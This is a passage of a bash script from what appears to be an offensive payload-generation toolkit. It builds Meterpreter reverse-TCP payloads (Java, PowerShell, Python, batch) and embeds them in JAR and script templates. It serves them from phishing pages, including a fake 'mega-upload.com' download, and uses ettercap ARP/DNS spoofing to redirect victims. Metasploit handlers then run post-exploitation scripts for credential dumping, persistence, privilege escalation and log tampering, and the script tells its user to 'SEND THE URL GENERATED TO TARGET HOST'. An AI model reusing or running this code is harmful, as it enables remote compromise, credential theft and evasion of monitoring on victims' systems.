serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'"
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 390) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi



if [ "$P0" = "post_linux.rc" ]; then
# store metasploit post exploit directory structure
CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
clear
cd $IPATH/



# ------------------------
# build base64 jar payload
# ------------------------
elif [ "$serv" = "windows/meterpreter/reverse_tcp (base64)" ]; then
echo "[☠] Building shellcode -> psh-cmd format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : windows/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"


# display shellcode
echo ""
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $str0
echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $IPATH/templates/exec.jar $IPATH/templates/exec[bak].jar
sleep 2
echo "[☠] Injecting shellcode -> $N4m.jar!"
sleep 2
cd $IPATH/templates
sed "s|InJ3C|$str0|" exec.jar > $N4m.jar
mv $N4m.jar $IPATH/output/$N4m.jar


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.jar\n\nchose how to deliver: $N4m.jar" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 240) > /dev/null 2>&1



   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
       fi


   else


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc13 driveBy[bak].html
      sed "s|NaM3|http://$lhost:$lport|g" driveBy.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
      echo "- THIS ATTACK VECTOR WILL TRIGGER PAYLOAD RCE"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.jar|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
          fi
        fi
   fi

# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
rm $ApAcHe/$N4m.jar > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
mv $IPATH/templates/exec[bak].jar $InJEc16 > /dev/null 2>&1
mv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
clear
cd $IPATH/



else
# CLEANING EVERYTHING UP
echo "[☠] Cancel button pressed, aborting..."
sleep 2
fi
}






# ---------------------------------------------------------
# WEB_DELIVERY PYTHON/PSH PAYLOADS (msfvenom web_delivery)
# loading from msfconsole the amazing web_delivery module
# writen by: 'Andrew Smith' 'Ben Campbell' 'Chris Campbell'
# this as nothing to do with shellcode, but i LOVE this :D
# ---------------------------------------------------------
sh_shellcode19 () {
# get user input to build the payload
echo "[☆] Enter shellcode settings!"
srvhost=$(zenity --title="☠ Enter SRVHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
# CHOSE WHAT PAYLOAD TO USE
PuLK=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Available payloads:" --radiolist --column "Pick" --column "Option" TRUE "python" FALSE "powershell" --width 305 --height 180) > /dev/null 2>&1


   if [ "$PuLK" = "python" ]; then
   echo "[☠] Building shellcode -> $PuLK format ..."
   sleep 2
   tagett="0"
   filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

 shellcode settings
+-------------------------------
| LPORT   : $lport
| URIPATH : /SecPatch
| SRVHOST : $srvhost
| FORMAT  : PYTHON -> MULTI OS
| PAYLOAD : python/meterpreter/reverse_tcp
|_STORED  : $IPATH/output/$filename.py

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.py $IPATH/templates/web_delivery[bak].py


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.py ]; then
      echo "[☠] web_delivery.py -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.py -> not found!"
      exit
   fi


# edit/backup files nedded
cd $IPATH/templates/
echo "[☠] building -> $filename.py"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.py > $filename.py
mv $filename.py $IPATH/output/$filename.py
chmod +x $IPATH/output/$filename.py



# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 360) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


if [ "$P0" = "post_linux.rc" ]; then
# store metasploit post exploit directory structure
CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
    echo "[✔] wifi_dump_linux.rb -> found"
    sleep 2
  else
    echo "[x] wifi_dump_linux.rb -> not found"
    sleep 1
    echo "    copy post-module to msfdb .."
    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
    echo "[☠] Reloading msfdb database .."
    sleep 2
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
  fi
fi


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.py|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.py $ApAcHe/$filename.py > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.py|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.py $ApAcHe/$filename.py
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else


        echo "- ATTACK VECTOR: http://$srvhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"

        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $filename-$srvhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/web_delivery[bak].py $IPATH/templates/web_delivery.py > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$filename.py > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
# -------------------------------------------------

   else

# -------------------------------------------------
echo "[☠] Building shellcode -> $PuLK format ..."
sleep 2
tagett="2"
filename=$(zenity --title="☠ Enter PAYLOAD name ☠" --text "example: payload" --entry --width 300) > /dev/null 2>&1

# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| URIPATH : /SecPatch
| SRVHOST : $srvhost
| FORMAT  : PSH -> WINDOWS
| PAYLOAD : windows/meterpreter/reverse_tcp
|_STORED  : $IPATH/output/$filename.bat

!


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $IPATH/templates/web_delivery.bat $IPATH/templates/web_delivery[bak].bat


   # check if exec.ps1 exists
   if [ -e $IPATH/templates/web_delivery.bat ]; then
      echo "[☠] web_delivery.bat -> found!"
      sleep 2
 
   else

      echo "[☠] web_delivery.bat -> not found!"
      exit
      fi


cd $IPATH/templates/
echo "[☠] building -> $filename.bat"
sleep 2
# use SED to replace SRVHOST in web_delivery.py
sed "s/SRVHOST/$srvhost/g" web_delivery.bat > $filename.bat
mv $filename.bat $IPATH/output/$filename.bat
chmod +x $IPATH/output/$filename.bat


# post-exploitation
P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 330) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


cd $IPATH/templates/phishing
cp $InJEc12 mega[bak].html
sed "s|NaM3|$filename.bat|g" mega.html > copy.html
mv copy.html $ApAcHe/index.html > /dev/null 2>&1
cd $IPATH/output
cp $filename.bat $ApAcHe/$filename.bat > /dev/null 2>&1
echo "[☠] loading -> Apache2Server!"
echo "---"
echo "- SEND THE URL GENERATED TO TARGET HOST"


        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$filename.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$filename.bat $ApAcHe/$filename.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " WEB_DELIVERY MSF MODULE " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET $tagett; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /SecPatch; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
